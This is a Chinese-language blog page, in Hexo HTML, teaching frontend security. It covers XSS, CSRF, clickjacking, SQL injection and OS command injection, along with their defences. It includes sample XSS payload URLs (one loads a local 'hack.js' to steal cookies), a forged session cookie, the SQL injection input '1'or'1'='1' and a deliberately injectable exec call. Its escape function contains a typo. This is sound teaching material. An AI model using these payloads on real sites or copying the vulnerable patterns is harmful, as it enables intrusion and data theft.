@@ -1,0 +1,771 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>前端安全-1 | xhai</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="系统安全问题，一直都是程序猿需要关心的事，而前端开发始终记住任何的输入都是有害的法则。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="前端安全-1">
+<meta property="og:url" content="https://cxid.gitee.io/2022/03/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81/index.html">
+<meta property="og:site_name" content="xhai">
+<meta property="og:description" content="系统安全问题，一直都是程序猿需要关心的事，而前端开发始终记住任何的输入都是有害的法则。">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-03-19T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-11-15T16:34:34.288Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="js">
+<meta property="article:tag" content="浏览器">
+<meta property="article:tag" content="服务器">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="xhai" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+<meta name="generator" content="Hexo 5.4.2"></head>
+<!-- 回传giteement评论页网址 -->
+<!-- <script src="https://giteement.oss-cn-beijing.aliyuncs.com/oauthcallback.browser.js"></script> -->
+<script src="/js/outh.js"></script>
+  <script>
+    Oauthcallback(); 
+  </script>
+
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/head.jpg" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate">xh</a></h1>
+        </hgroup>
+
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">博客首页</a></li>
+                        
+                            <li><a href="/works">作品展示</a></li>
+                        
+                            <li><a href="/clock">留言打卡</a></li>
+                        
+                            <li><a href="/tags">文章标签</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=PAkNDgsKBQ4MCnxNTRJfU1E" title="mail">mail</a>
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/xhlife" title="github">github</a>
+                            
+                                <a class="fl zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
+                            
+                                <a class="fl weibo" target="_blank" href="#" title="weibo">weibo</a>
+                            
+                                <a class="fl google" target="_blank" href="#" title="google">google</a>
+                            
+                                <a class="fl twitter" target="_blank" href="#" title="twitter">twitter</a>
+                            
+                                <a class="fl linkedin" target="_blank" href="#" title="linkedin">linkedin</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/DNS/" style="font-size: 10px;">DNS</a> <a href="/tags/Element-ui/" style="font-size: 10px;">Element-ui</a> <a href="/tags/Gzip/" style="font-size: 10px;">Gzip</a> <a href="/tags/HTTP/" style="font-size: 14.29px;">HTTP</a> <a href="/tags/IE/" style="font-size: 10px;">IE</a> <a href="/tags/IOS/" style="font-size: 11.43px;">IOS</a> <a href="/tags/JSCore/" style="font-size: 10px;">JSCore</a> <a href="/tags/Javascript/" style="font-size: 17.14px;">Javascript</a> <a href="/tags/Node-js/" style="font-size: 12.86px;">Node.js</a> <a href="/tags/TCP/" style="font-size: 10px;">TCP</a> <a href="/tags/Vue/" style="font-size: 17.14px;">Vue</a> <a href="/tags/WebCore/" style="font-size: 10px;">WebCore</a> <a href="/tags/blog/" style="font-size: 10px;">blog</a> <a href="/tags/canvas/" style="font-size: 11.43px;">canvas</a> <a href="/tags/cli/" style="font-size: 10px;">cli</a> <a href="/tags/docker/" style="font-size: 10px;">docker</a> <a href="/tags/es6/" style="font-size: 10px;">es6</a> <a href="/tags/git/" style="font-size: 10px;">git</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/highlight%E7%BB%84%E4%BB%B6/" style="font-size: 10px;">highlight组件</a> <a href="/tags/html/" style="font-size: 10px;">html</a> <a href="/tags/iframe/" style="font-size: 10px;">iframe</a> <a href="/tags/javascript/" style="font-size: 14.29px;">javascript</a> <a href="/tags/js/" style="font-size: 20px;">js</a> <a href="/tags/nginx/" style="font-size: 10px;">nginx</a> <a href="/tags/node/" style="font-size: 10px;">node</a> <a href="/tags/ts/" style="font-size: 18.57px;">ts</a> <a href="/tags/vite/" style="font-size: 10px;">vite</a> <a href="/tags/vue/" style="font-size: 12.86px;">vue</a> <a href="/tags/vue-cli/" style="font-size: 10px;">vue-cli</a> <a href="/tags/vue-router/" style="font-size: 11.43px;">vue-router</a> <a href="/tags/vue3/" style="font-size: 17.14px;">vue3</a> <a href="/tags/webkit/" style="font-size: 10px;">webkit</a> <a href="/tags/webpack/" style="font-size: 14.29px;">webpack</a> <a href="/tags/%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE/" style="font-size: 10px;">传输层协议</a> <a href="/tags/%E5%85%BC%E5%AE%B9%E6%80%A7%E5%A4%84%E7%90%86/" style="font-size: 10px;">兼容性处理</a> <a href="/tags/%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/" style="font-size: 10px;">前端性能优化</a> <a href="/tags/%E5%AF%8C%E6%96%87%E6%9C%AC%E6%8F%92%E4%BB%B6/" style="font-size: 10px;">富文本插件</a> <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="font-size: 10px;">服务器</a> <a href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/" style="font-size: 15.71px;">浏览器</a> <a href="/tags/%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2/" style="font-size: 10px;">项目部署</a>
+                    </div>
+                </section>
+                
+                
+                
+
+                
+                
+                <section class="switch-part switch-part3">
+                
+                    <div id="js-aboutme">爱运动、喜欢接触新鲜事物、迎接新的挑战，更爱游离于错综复杂的编码与逻辑中</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">xh</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">xh</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客首页</a></li>
+                
+                    <li><a href="/works">作品展示</a></li>
+                
+                    <li><a href="/clock">留言打卡</a></li>
+                
+                    <li><a href="/tags">文章标签</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=PAkNDgsKBQ4MCnxNTRJfU1E" title="mail">mail</a>
+                    
+                        <a class="github" target="_blank" href="https://github.com/xhlife" title="github">github</a>
+                    
+                        <a class="zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
+                    
+                        <a class="weibo" target="_blank" href="#" title="weibo">weibo</a>
+                    
+                        <a class="google" target="_blank" href="#" title="google">google</a>
+                    
+                        <a class="twitter" target="_blank" href="#" title="twitter">twitter</a>
+                    
+                        <a class="linkedin" target="_blank" href="#" title="linkedin">linkedin</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="页面布局（配合主题文档使用）-前端安全1" class="article article-type-页面布局（配合主题文档使用）" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/03/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81/" class="article-date">
+      <time datetime="2022-03-19T16:00:00.000Z" itemprop="datePublished">2022-03-20</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      前端安全-1
+    </h1>
+  
+
+        
+          <div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-keyboard-o"></i>
+      <span class="post-meta-item-text">  字数统计: </span>
+      <span class="post-count">2.5k字</span>
+    </span>
+  </span>
+  &nbsp; | &nbsp;
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-hourglass-half"></i>
+      <span class="post-meta-item-text">  阅读时长: </span>
+      <span class="post-count">10分</span>
+    </span>
+  </span>
+</div>
+
+          
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/">前端安全</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/" rel="tag">服务器</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/" rel="tag">浏览器</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="XSS实施和防御"><a href="#XSS实施和防御" class="headerlink" title="XSS实施和防御"></a>XSS实施和防御</h3><p>Cross Site Script (跨站脚本攻击)</p>
+<p>因简写与CSS同名，故叫xss</p>
+<p>跨站脚本攻击指的是： 通过存在安全漏洞的Web网站注册用户的浏览器内， 运行非法的非本站点HTML或JS的一种攻击</p>
+<p>造成的影响： </p>
+<ul>
+<li><p>利⽤虚假输⼊表单骗取⽤户个⼈信息。</p>
+</li>
+<li><p>利⽤脚本窃取⽤户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。</p>
+</li>
+<li><p>显示伪造的⽂章或图⽚。</p>
+</li>
+</ul>
+<h4 id="XSS攻击分类"><a href="#XSS攻击分类" class="headerlink" title="XSS攻击分类"></a>XSS攻击分类</h4><blockquote>
+<p>反射型 - url参数直接注入</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 普通</span></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//localhost:3000/?form=china</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// alert尝试</span></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//localhost:3000/?form=&lt;script&gt;alert(3)&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取Cookie</span></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//localhost:3000/?from=&lt;script src=&quot;http://localhost:4000/hack.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 短域名伪造 https://dwz.cn/</span></span><br><span class="line"><span class="comment">// 伪造cookie⼊侵 chrome</span></span><br><span class="line"><span class="comment">// document.cookie=&quot;kaikeba:sess=eyJ1c2VybmFtZSI6Imxhb3dhbmciLCJfZXhwaXJlIjoxNTUz</span></span><br><span class="line"><span class="comment">// NTY1MDAxODYxLCJfbWF4QWdlIjo4NjQwMDAwMH0=&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>存储型-存储到DB后，读取时注入</p>
+</blockquote>
+<p>比如，存储了用户的评论 </p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 要存储的评论 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span> alert(1) <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// 页面读取之后可能会执行这段代码</span><br></pre></td></tr></table></figure>
+
+<h4 id="XSS防范手段"><a href="#XSS防范手段" class="headerlink" title="XSS防范手段"></a>XSS防范手段</h4><blockquote>
+<p>设置 HEAD</p>
+</blockquote>
+<p>以koa程序代码为例子</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ctx.<span class="title function_">set</span>(<span class="string">&#x27;X-XSS-Protection&#x27;</span>, <span class="number">0</span>) <span class="comment">// 禁⽌XSS过滤</span></span><br><span class="line"><span class="comment">// http://localhost:3000/?from=&lt;script&gt;alert(3)&lt;/script&gt; 可以拦截 但伪装⼀下就不⾏了</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>0 禁⽌XSS过滤。</li>
+<li>1 启⽤XSS过滤（通常浏览器是默认的）。 如果检测到跨站脚本攻击，浏览器将清除⻚⾯（删除不安全的部分）。</li>
+<li>1;mode=block 启⽤XSS过滤。 如果检测到攻击，浏览器将不会清除⻚⾯，⽽是阻⽌⻚⾯加载。</li>
+<li>1; report= (Chromium only) 启⽤XSS过滤。 如果检测到跨站脚本攻击，浏览器将清除⻚⾯并使⽤CSPreport-uri 指令的功能发送违规报告。</li>
+</ul>
+<blockquote>
+<p>通过CSP 防范</p>
+</blockquote>
+<p>csp: 内容安全策略是⼀个附加的安全层，⽤于帮助检测和缓解某些类型的攻击，<br>包括跨站脚本 (XSS) 和数据注⼊等攻击。 这些攻击可⽤于实现从数据窃取到<br>⽹站破坏或作为恶意软件分发版本等⽤途。</p>
+<p>CSP 本质上就是建⽴⽩名单，开发者明确告诉浏览器哪些外部资源可以加载和执⾏。我们只<br>需要配置规则，如何拦截是由浏览器⾃⼰实现的。我们可以通过这种⽅式来尽量减少 XSS 攻<br>击。</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 只允许加载本站资源</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Security</span>-<span class="title class_">Policy</span>: <span class="keyword">default</span>-src <span class="string">&#x27;self&#x27;</span></span><br><span class="line"><span class="comment">// 只允许加载 HTTPS 协议图⽚</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Security</span>-<span class="title class_">Policy</span>: img-src <span class="attr">https</span>:<span class="comment">//*</span></span><br><span class="line"><span class="comment">// 不允许加载任何来源框架</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Security</span>-<span class="title class_">Policy</span>: child-src <span class="string">&#x27;none&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.<span class="title function_">set</span>(<span class="string">&#x27;Content-Security-Policy&#x27;</span>, <span class="string">&quot;default-src &#x27;self&#x27;&quot;</span>)</span><br><span class="line"><span class="comment">// 尝试⼀下外部资源不能加载</span></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//localhost:3000/?from=&lt;script src=&quot;http://localhost:4000/hack.js&quot;&gt;</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>转义字符、黑名单与白名单</p>
+</blockquote>
+<p>⽤户的输⼊永远不可信任的，最普遍的做法就是转义输⼊输出的内容，对于引号、尖括号、斜杠进⾏转义</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">escape</span>(<span class="params">str</span>) &#123;</span><br><span class="line">  str = str.<span class="title function_">replace</span>(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>)</span><br><span class="line">  str = str.<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line">  str = str.<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>)</span><br><span class="line">  str = str.<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&amp;quto;&#x27;</span>)</span><br><span class="line">  str = str.<span class="title function_">replace</span>(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&amp;#39;&#x27;</span>)</span><br><span class="line">  str = str.<span class="title function_">replace</span>(<span class="regexp">/`/g</span>, <span class="string">&#x27;&amp;#96;&#x27;</span>)</span><br><span class="line">  str = str.<span class="title function_">replace</span>(<span class="regexp">/\//g</span>, <span class="string">&#x27;&amp;#x2F;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> str</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>富⽂本来说，显然不能通过上⾯的办法来转义所有字符，因为这样会把需要的格式也过滤掉。对<br>于这种情况，通常采⽤⽩名单过滤的办法，当然也可以通过⿊名单过滤，但是考虑到需要过滤的<br>标签和标签属性实在太多，更加推荐使⽤⽩名单的⽅式。</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> xss = <span class="built_in">require</span>(<span class="string">&#x27;xss&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> html = <span class="title function_">xss</span>(<span class="string">&#x27;&lt;h1 id=&quot;title&quot;&gt;XSS Demo&lt;/h1&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;&#x27;</span>)</span><br><span class="line"><span class="comment">// -&gt; &lt;h1&gt;XSS Demo&lt;/h1&gt;&amp;lt;script&amp;gt;alert(&quot;xss&quot;);&amp;lt;/script&amp;gt;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(html)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>HttpOnly Cookie</p>
+</blockquote>
+<p>这是预防XSS攻击窃取⽤户cookie最有效的防御⼿段。Web应 ⽤程序在设置cookie时，将其<br>属性设为HttpOnly，就可以避免该⽹⻚的cookie被客户端恶意JavaScript窃取，保护⽤户<br>cookie信息。</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">response.<span class="title function_">addHeader</span>(<span class="string">&quot;Set-Cookie&quot;</span>, <span class="string">&quot;uid=112; Path=/; HttpOnly&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="CSRF实施和防御"><a href="#CSRF实施和防御" class="headerlink" title="CSRF实施和防御"></a>CSRF实施和防御</h3><p>CSRF(Cross Site Request Forgery)，即跨站请求伪造，是⼀种常⻅的Web攻击，它利⽤⽤户已登<br>录的身份，在⽤户毫不知情的情况下，以⽤户的名义完成⾮法操作。</p>
+<ul>
+<li>⽤户已经登录了站点 A，并在本地记录了 cookie</li>
+<li>在⽤户没有登出站点 A 的情况下（也就是 cookie ⽣效的情况下），访问了恶意攻击者提供的引诱</li>
+<li>危险站点 B (B 站点要求访问站点A)。</li>
+<li>站点 A 没有做任何 CSRF 防御</li>
+</ul>
+<h4 id="CSRF的危害"><a href="#CSRF的危害" class="headerlink" title="CSRF的危害"></a>CSRF的危害</h4><ul>
+<li>利⽤⽤户登录态</li>
+<li>⽤户不知情</li>
+<li>完成业务请求</li>
+<li>盗取⽤户资⾦（转账，消费）</li>
+<li>冒充⽤户发帖背锅</li>
+<li>损害⽹站声誉</li>
+</ul>
+<h4 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h4><blockquote>
+<p>禁⽌第三⽅⽹站带Cookie - 有兼容性问题</p>
+</blockquote>
+<blockquote>
+<p>Referer Check - Https不发送referer</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">await</span> <span class="title function_">next</span>()</span><br><span class="line">  <span class="keyword">const</span> referer = ctx.<span class="property">request</span>.<span class="property">header</span>.<span class="property">referer</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Referer:&#x27;</span>, referer)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>验证码操作</p>
+</blockquote>
+<h3 id="点击劫持实施和防御"><a href="#点击劫持实施和防御" class="headerlink" title="点击劫持实施和防御"></a>点击劫持实施和防御</h3><p>点击劫持是⼀种视觉欺骗的攻击⼿段。攻击者将需要攻击的⽹站通过 iframe 嵌套的⽅式嵌⼊⾃⼰<br>的⽹⻚中，并将 iframe 设置为透明，在⻚⾯中透出⼀个按钮诱导⽤户点击。</p>
+<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><blockquote>
+<p> X-FRAME-OPTIONS</p>
+</blockquote>
+<p>X-FRAME-OPTIONS 是⼀个 HTTP 响应头，在现代浏览器有⼀个很好的⽀持。这个 HTTP 响应头 就<br>是为了防御⽤ iframe 嵌套的点击劫持攻击。<br>该响应头有三个值可选，分别是</p>
+<ul>
+<li>DENY，表示⻚⾯不允许通过 iframe 的⽅式展示</li>
+<li>SAMEORIGIN，表示⻚⾯可以在相同域名下通过 iframe 的⽅式展示</li>
+<li>ALLOW-FROM，表示⻚⾯可以在指定来源的 iframe 中展示</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ctx.<span class="title function_">set</span>(<span class="string">&#x27;X-FRAME-OPTIONS&#x27;</span>, <span class="string">&#x27;DENY&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>JS方式防御</p>
+</blockquote>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span> <span class="attr">id</span>=<span class="string">&quot;click-jack&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-tag">html</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">display</span>: none <span class="meta">!important</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (self == top) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> style = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;click-jack&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(style)</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      top.<span class="property">location</span> = self.<span class="property">location</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>以上代码的作⽤就是当通过 iframe 的⽅式加载⻚⾯时，攻击者的⽹⻚直接不显示所有内容了。</p>
+<h3 id="SQL注入和防御"><a href="#SQL注入和防御" class="headerlink" title="SQL注入和防御"></a>SQL注入和防御</h3><p>前端输入sql相关的语句，攻击数据库</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span> 填⼊特殊密码</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;or&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 拼接后的<span class="keyword">SQL</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> test.user</span><br><span class="line"><span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;laowang&#x27;</span></span><br><span class="line"><span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span><span class="keyword">or</span><span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h4><ul>
+<li>所有的查询语句建议使⽤数据库提供的参数化查询接⼝**，参数化的语句使⽤参数⽽不是将⽤户<br>输⼊变量嵌⼊到 SQL 语句中，即不要直接拼接 SQL 语句。例如 Node.js 中的 mysqljs 库的 query<br>⽅法中的 ? 占位参数。</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 错误写法</span></span><br><span class="line"><span class="keyword">const</span> sql = <span class="string">`</span></span><br><span class="line"><span class="string">  SELECT *</span></span><br><span class="line"><span class="string">  FROM test.user</span></span><br><span class="line"><span class="string">  WHERE username = &#x27;<span class="subst">$&#123;ctx.request.body.username&#125;</span>&#x27;</span></span><br><span class="line"><span class="string">  AND password = &#x27;<span class="subst">$&#123;ctx.request.body.password&#125;</span>&#x27;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;sql&#x27;</span>, sql)</span><br><span class="line">res = <span class="keyword">await</span> <span class="title function_">query</span>(sql)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确的写法</span></span><br><span class="line"><span class="keyword">const</span> sql = <span class="string">`</span></span><br><span class="line"><span class="string">  SELECT *</span></span><br><span class="line"><span class="string">  FROM test.user</span></span><br><span class="line"><span class="string">  WHERE username = ?</span></span><br><span class="line"><span class="string">  AND password = ?</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;sql&#x27;</span>, sql, )</span><br><span class="line">res = <span class="keyword">await</span> <span class="title function_">query</span>(sql,[ctx.<span class="property">request</span>.<span class="property">body</span>.<span class="property">username</span>, ctx.<span class="property">request</span>.<span class="property">body</span>.<span class="property">password</span>])</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>严格限制Web应⽤的数据库的操作权限**，给此⽤户提供仅仅能够满⾜其⼯作的最低权限，从⽽<br>最⼤限度的减少注⼊攻击对数据库的危害</p>
+</li>
+<li><p>后端代码检查输⼊的数据是否符合预期**，严格限制变量的类型，例如使⽤正则表达式进⾏⼀些<br>匹配处理。</p>
+</li>
+<li><p>对进⼊数据库的特殊字符（’，”，\，&lt;，&gt;，&amp;，*，; 等）进⾏转义处理，或编码转换**。基本上所<br>有的后端语⾔都有对字符串进⾏转义处理的⽅法，⽐如 lodash 的 lodash._escapehtmlchar 库。</p>
+</li>
+</ul>
+<h3 id="OS注入和防御"><a href="#OS注入和防御" class="headerlink" title="OS注入和防御"></a>OS注入和防御</h3><p>OS命令注⼊和SQL注⼊差不多，只不过SQL注⼊是针对数据库的，⽽OS命令注⼊是针对操作系统的。OS命令<br>注⼊攻击指通过Web应⽤，执⾏⾮法的操作系统命令达到攻击的⽬的。只要在能调⽤Shell函数的地⽅就有<br>存在被攻击的⻛险。倘若调⽤Shell时存在疏漏，就可以执⾏插⼊的⾮法命令。</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 以 Node.js 为例，假如在接⼝中需要从 github 下载⽤户指定的 repo</span></span><br><span class="line"><span class="keyword">const</span> exec = <span class="built_in">require</span>(<span class="string">&#x27;mz/child_process&#x27;</span>).<span class="property">exec</span>;</span><br><span class="line"><span class="keyword">let</span> params = &#123;<span class="comment">/* ⽤户输⼊的参数 */</span>&#125;;</span><br><span class="line"><span class="title function_">exec</span>(<span class="string">`git clone <span class="subst">$&#123;params.repo&#125;</span> /some/path`</span>);</span><br></pre></td></tr></table></figure>
+
+<p>传⼊的参数是会怎样?</p>
